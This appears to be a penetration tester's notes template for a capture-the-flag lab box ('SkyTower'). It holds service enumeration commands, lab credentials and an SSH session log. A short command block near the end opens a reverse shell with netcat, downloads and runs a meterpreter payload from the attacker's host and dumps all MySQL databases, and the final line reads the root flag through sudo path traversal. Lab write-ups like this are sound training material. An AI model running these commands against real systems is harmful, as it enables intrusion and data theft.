BOX NAME: BOXNAME  
LINK: LINK

IP=192.168.0.167  
URL=http://192.168.0.167

# Credentials:

\[+\] john:hereisjohn  
\[+\] sara:ihatethisjob  
\[+\] william:sensable

# Hashes:

\[+\]

# Remote Enumeration:

### Host Discovery

### Nmap scan

# Hosts and computers:

\[+\] HOSTS:  
\[+\] FQDN:  
\[+\] COMPUTER NAME:  
\[+\] OS:

# LOOK AT IT!:

\[+\]

# Special searchsploit findings:

\[+\] Port 21 \[FTP\]  
\[+\] Port 22 \[SSH\]  
\[+\] Port 23 \[TELNET\]  
\[+\] Port 25 \[SMTP\]  
\[+\] Port 53 \[DNS\]  
\[+\] Port 80 \[HTTP\]  
\[+\] Port 88 \[Kerberos\]  
\[+\] Port 110 \[POP3\]  
\[+\] Port 111 \[NFS\]  
\[+\] Port 137 \[NETBIOS\]  
\[+\] Port 139 \[NETBIOS\]  
\[+\] Port 143 \[IMAP\]  
\[+\] Port 443 \[HTTPS\]  
\[+\] Port 445 \[SAMBA\]  
\[+\] Port 464 \[Kerberos\]  
\[+\] Port 465 \[SMTP\]  
\[+\] Port 631 \[CUPS\]  
\[+\] Port 587 \[SMTP /SSL\]  
\[+\] Port 993 \[IMAP /SSL\]  
\[+\] Port 995 \[POP3 /SSL\]  
\[+\] Port 1194 \[OPENVPN\]  
\[+\] Port 2049 \[NFS\]  
\[+\] Port 3306 \[MySQL\]  
\[+\] Port 5432 \[PostgreSQL\]  
\[+\] Port 5900 \[VNC\]  
\[+\] Port 5901 \[VNC\]  
\[+\] Port 6001 \[X-SERVER\]  
\[+\] Port 6667 \[IRC\]  
\[+\] Port 6668 \[IRC\]  
\[+\] Port 6669 \[IRC\]  
\[+\] Port 6881 \[TORRENT\]  
\[+\] Port 8080 \[HTTP\]

# FTP:

\[+\] ftp anonyomus@$IP

# SMB:

\[+\] smbclient -L $IP

# NFS:

\[+\] showmount -e $IP  
\[+\] mount -t nfs $IP:/remote/folder local/folder

# SMTP:

\[+\] smtp-user-enum -U users.txt -t $IP

# HTTP/HTTPS:

\[+\] feroxbuster -u $IP -d 1

\[+\] gobuster dir http://IP\[+\]gobustervhosthttp://IP \[+\] gobuster vhost http://IP\[+\]gobustervhosthttp://IP

\[+\] Nikto --url http://$IP -C all

\[+\] ffuf -u '$URL/FUZZ' -w wordlist.txt -fs filtersize

# enum4linux:

\[+\] enum4linux -A $IP

# CMS:

\[+\] cmseek -u http://$IP --random-agent

\[+\] wpscan -u $IP

\[+\] droopescan -u $IP

\[+\] joomscan -u $IP -ec

# Local Filesystem Findings:

\[+\] FILES OF INTEREST

\[+\] SUID

\[+\] SGID

\[+\] Dumps, outputs, other useful information

```
Welcome john@skytech.com
As you may know, SkyTech has ceased all international operations.
To all our long term employees, we wish to convey our thanks for your dedication and hard work.
Unfortunately, all international contracts, including yours have been terminated.
The remainder of your contract and retirement fund, $2 ,has been payed out in full to a secure account. For security reasons, you must login to the SkyTech server via SSH to access the account details.
Username: john
Password: hereisjohn
We wish you the best of luck in your future endeavors.
```

<img src="../../_resources/3f03cfea3b5f5de661496554910f0cd6.png" alt="3f03cfea3b5f5de661496554910f0cd6.png" width="435" height="452" class="jop-noMdConv">

```
└─# ssh john@127.0.0.1 -p 2222
The authenticity of host '[127.0.0.1]:2222 ([127.0.0.1]:2222)' can't be established.
ECDSA key fingerprint is SHA256:QYZqyNNW/Z81N86urjCUIrTBvJ06U9XDDzNv91DYaGc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:2222' (ECDSA) to the list of known hosts.
john@127.0.0.1's password: 
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 20 07:41:08 2014

Funds have been withdrawn
Connection to 127.0.0.1 closed
```

```bash
#noteworthy commands (since the box seems to be broken..)

#to catch a reverse shell since the SSH service terminates right after login
sshpass -p hereisjohn ssh john@127.0.0.1 -p 2222 -C 'nc 192.168.0.163 7776 -e /bin/bash'
#To be able to download files via meterpreter.
sshpass -p hereisjohn ssh john@127.0.0.1 -p 2222 -C 'wget http://192.168.0.163:8000/rev.elf; chmod +x rev.elf; ./rev.elf&' 
# To grab all databases
mysqldump -u root --all-databases -p root
```

# Exploits and Payloads:

\[+\] sudo /bin/cat /accounts/../root/flag.txt